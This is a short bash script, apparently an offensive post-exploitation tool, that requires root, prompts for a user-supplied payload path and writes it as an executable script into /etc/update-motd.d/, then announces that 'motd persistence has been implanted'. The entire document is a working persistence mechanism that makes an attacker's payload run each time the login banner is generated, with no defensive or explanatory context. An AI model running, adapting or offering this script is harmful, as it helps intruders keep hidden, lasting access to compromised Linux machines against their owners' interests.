#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

read -p "Enter path with your payload or script: " add

function AddMotd() {
touch /etc/update-motd.d/50-pers
echo -ne "#!/bin/bash\n" > /etc/update-motd.d/50-pers
echo 	"$add" >> /etc/update-motd.d/50-pers
chmod +x /etc/update-motd.d/50-pers
}

AddMotd

clear

echo "[*] Success!! Your motd persistence has been implanted. [*]"

sleep 1

clear

